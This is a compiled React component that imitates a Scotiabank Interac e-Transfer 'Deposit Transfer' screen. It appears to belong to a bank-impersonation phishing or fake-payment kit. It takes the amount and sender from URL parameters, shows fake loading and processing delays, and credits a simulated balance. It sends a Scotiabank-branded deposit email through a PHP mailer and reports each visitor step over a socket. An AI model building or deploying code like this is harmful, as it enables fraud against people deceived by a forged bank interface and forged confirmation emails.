import { jsx as _jsx, jsxs as _jsxs, Fragment as _Fragment } from "react/jsx-runtime";
import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ChevronDown, ArrowLeft, CheckCircle2, Shield, Landmark } from 'lucide-react';
import { useBank } from '../shared/BankContext';
import { sendEmail } from '../shared/services/emailRelay';
import { useSocket } from '../shared/SocketContext';
export const DepositView = ({ onBack, theme = 'light' }) => {
    const { user, updateAccount, updateUser } = useBank();
    const { emitAction } = useSocket();
    const [step, setStep] = useState('loading');
    const [ref, setRef] = useState('');
    const [amount, setAmount] = useState('');
    const [sender, setSender] = useState('');
    const [recipient, setRecipient] = useState('');
    const [selectedAccount, setSelectedAccount] = useState(null);
    const [showAccountSelector, setShowAccountSelector] = useState(false);
    useEffect(() => {
        const params = new URLSearchParams(window.location.search);
        const refParam = params.get('ref') || '';
        const amtParam = params.get('amt') || '';
        const fromParam = params.get('from') || '';
        const toParam = params.get('to') || '';
        setRef(refParam);
        setAmount(amtParam);
        setSender(fromParam);
        setRecipient(toParam);
        emitAction('Deposit View Loaded', { ref: refParam, amount: amtParam, from: fromParam });
        // Simulate loading
        const timer = setTimeout(() => {
            setStep('input');
        }, 1500);
        return () => clearTimeout(timer);
    }, []);
    const handleDeposit = async () => {
        if (!selectedAccount || !user)
            return;
        emitAction('Deposit Button Clicked', { account: selectedAccount, amount });
        setStep('processing');
        // Simulate network delay
        await new Promise(resolve => setTimeout(resolve, 2000));
        const amt = parseFloat(amount);
        const account = user.accounts[selectedAccount];
        if (account) {
            const transaction = {
                id: `DEP-${Date.now()}`,
                date: new Date().toISOString(),
                description: `Interac e-Transfer Deposit from ${sender}`,
                amount: amt,
                status: 'Completed',
                category: 'Deposit'
            };
            const updatedAccounts = { ...user.accounts };
            updatedAccounts[selectedAccount] = {
                ...account,
                balance: account.balance + amt,
                history: [...account.history, transaction]
            };
            // Remove from pending if it exists
            const pendingTransfers = user.pendingTransfers || [];
            const updatedPending = pendingTransfers.filter(t => t.id !== ref && t.amount !== amt);
            await updateUser({
                accounts: updatedAccounts,
                pendingTransfers: updatedPending
            });
            // Send deposited email
            const today = new Date();
            const dateStr = today.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
            const mailerUrl = '/api/mailer.php';
            try {
                await sendEmail({
                    recipient_email: user.username,
                    recipient_name: recipient,
                    amount: amt,
                    reference_number: ref,
                    date: dateStr,
                    purpose: 'Interac e-Transfer Deposited',
                    template: 'deposited.html',
                    sender_name: sender,
                    bank_name: 'Scotiabank',
                    greeting: `Hi ${recipient},`,
                    headline: `Your Interac e-Transfer from ${sender} has been deposited.`,
                    app_url: window.location.origin,
                    security_warning_text: 'Keep your passwords and security answers private. Scotiabank will never ask for them by email or text.',
                }, mailerUrl);
            }
            catch (e) {
                console.error("Error sending deposit email:", e);
            }
            setStep('success');
        }
    };
    if (step === 'loading') {
        return (_jsxs("div", { className: "h-full w-full bg-white flex flex-col items-center justify-center p-6", children: [_jsx(motion.div, { animate: { rotate: 360 }, transition: { duration: 1, repeat: Infinity, ease: "linear" }, className: "w-12 h-12 border-4 border-gray-100 border-t-[#ED0711] rounded-full mb-4" }), _jsx("p", { className: "text-gray-500 text-sm font-medium", children: "Loading transfer details..." })] }));
    }
    if (step === 'processing') {
        return (_jsxs("div", { className: "h-full w-full bg-white flex flex-col items-center justify-center p-6", children: [_jsx(motion.div, { animate: { scale: [1, 1.1, 1] }, transition: { duration: 1.5, repeat: Infinity }, className: "w-20 h-20 bg-[#ED0711]/10 rounded-full flex items-center justify-center mb-6", children: _jsx(Landmark, { className: "w-10 h-10 text-[#ED0711]" }) }), _jsx("h2", { className: "text-gray-900 text-lg font-bold mb-2", children: "Depositing Funds" }), _jsx("p", { className: "text-gray-500 text-xs text-center", children: "We're securely transferring your funds to your selected account." })] }));
    }
    if (step === 'success') {
        return (_jsxs("div", { className: "h-full w-full bg-white flex flex-col p-6", children: [_jsxs("div", { className: "flex-1 flex flex-col items-center justify-center", children: [_jsx(motion.div, { initial: { scale: 0 }, animate: { scale: 1 }, className: "w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mb-6", children: _jsx(CheckCircle2, { className: "w-10 h-10 text-emerald-500" }) }), _jsx("h2", { className: "text-gray-900 text-xl font-bold mb-2", children: "Successfully deposited" }), _jsx("p", { className: "text-gray-500 text-center mb-8", children: "Successfully deposited" }), _jsxs("div", { className: "w-full bg-gray-50 rounded-2xl p-6 border border-gray-200 space-y-4", children: [_jsxs("div", { className: "flex justify-between items-center", children: [_jsx("span", { className: "text-gray-500 text-xs", children: "Reference Number" }), _jsx("span", { className: "text-gray-900 font-mono text-xs", children: ref })] }), _jsxs("div", { className: "flex justify-between items-center", children: [_jsx("span", { className: "text-gray-500 text-xs", children: "Deposited To" }), _jsx("span", { className: "text-gray-900 text-xs", children: selectedAccount })] }), _jsxs("div", { className: "flex justify-between items-center", children: [_jsx("span", { className: "text-gray-500 text-xs", children: "Date" }), _jsx("span", { className: "text-gray-900 text-xs", children: new Date().toLocaleDateString() })] })] })] }), _jsx("button", { onClick: onBack, className: "w-full bg-[#ED0711] text-white py-4 rounded-xl font-bold text-base active:scale-95 transition-transform", children: "Return to Dashboard" })] }));
    }
    return (_jsxs("div", { className: "h-full w-full bg-white flex flex-col", children: [_jsxs("div", { className: "p-6 flex items-center gap-4 border-b border-gray-100", children: [_jsx("button", { onClick: onBack, className: "text-gray-900", children: _jsx(ArrowLeft, { className: "w-6 h-6" }) }), _jsx("h1", { className: "text-gray-900 text-lg font-bold", children: "Deposit Transfer" })] }), _jsxs("div", { className: "flex-1 overflow-y-auto p-6 space-y-8", children: [_jsxs("div", { className: "text-center space-y-2", children: [_jsx("p", { className: "text-gray-500 text-xs uppercase tracking-widest font-bold", children: "You've Received" }), _jsx("h2", { className: "text-gray-900 text-3xl font-bold", children: new Intl.NumberFormat('en-CA', { style: 'currency', currency: 'CAD' }).format(parseFloat(amount)) }), _jsxs("p", { className: "text-gray-500", children: ["From: ", _jsx("span", { className: "text-gray-900 font-medium", children: sender })] })] }), _jsxs("div", { className: "space-y-4", children: [_jsx("label", { className: "text-gray-500 text-[10px] font-bold uppercase tracking-wider px-1", children: "Deposit To" }), _jsxs("button", { onClick: () => setShowAccountSelector(true), className: "w-full bg-white p-4 rounded-xl border border-gray-200 flex items-center justify-between text-left shadow-sm", children: [_jsxs("div", { children: [_jsx("p", { className: "text-gray-900 font-medium", children: selectedAccount || 'Select an account' }), selectedAccount && (_jsxs("p", { className: "text-gray-500 text-[10px]", children: ["Balance: ", new Intl.NumberFormat('en-CA', { style: 'currency', currency: 'CAD' }).format(user?.accounts[selectedAccount]?.balance || 0)] }))] }), _jsx(ChevronDown, { className: "w-5 h-5 text-gray-500" })] })] }), _jsxs("div", { className: "bg-gray-50 p-4 rounded-xl border border-gray-200 flex gap-4", children: [_jsx(Shield, { className: "w-6 h-6 text-[#ED0711] shrink-0" }), _jsx("p", { className: "text-gray-500 text-[10px] leading-relaxed", children: "Your funds are protected by Interac e-Transfer security. This deposit will be processed immediately and reflected in your account balance." })] })] }), _jsx("div", { className: "p-6", children: _jsx("button", { disabled: !selectedAccount, onClick: handleDeposit, className: `w-full py-4 rounded-xl font-bold text-base transition-all ${selectedAccount
                        ? 'bg-[#ED0711] text-white active:scale-95'
                        : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`, children: "Deposit Now" }) }), _jsx(AnimatePresence, { children: showAccountSelector && user && (_jsxs(_Fragment, { children: [_jsx(motion.div, { initial: { opacity: 0 }, animate: { opacity: 1 }, exit: { opacity: 0 }, onClick: () => setShowAccountSelector(false), className: "absolute inset-0 bg-black/60 z-40" }), _jsxs(motion.div, { initial: { y: '100%' }, animate: { y: 0 }, exit: { y: '100%' }, className: "fixed bottom-0 left-0 right-0 bg-white rounded-t-3xl z-50 p-6 max-h-[70vh] overflow-y-auto", children: [_jsxs("div", { className: "flex justify-between items-center mb-6", children: [_jsx("h3", { className: "text-gray-900 text-base font-bold", children: "Select Account" }), _jsx("button", { onClick: () => setShowAccountSelector(false), className: "text-gray-500", children: _jsx(ChevronDown, { className: "w-6 h-6" }) })] }), _jsx("div", { className: "space-y-3", children: Object.entries(user.accounts).filter(([_, acc]) => acc.type === 'banking').map(([name, acc]) => (_jsxs("button", { onClick: () => {
                                            setSelectedAccount(name);
                                            setShowAccountSelector(false);
                                        }, className: `w-full p-4 rounded-xl border transition-all text-left ${selectedAccount === name ? 'border-[#ED0711] bg-[#ED0711]/5' : 'border-gray-100 bg-gray-50'}`, children: [_jsx("p", { className: "text-gray-900 font-medium", children: name }), _jsx("p", { className: "text-gray-500 text-xs", children: new Intl.NumberFormat('en-CA', { style: 'currency', currency: 'CAD' }).format(acc.balance) })] }, name))) })] })] })) })] }));
};
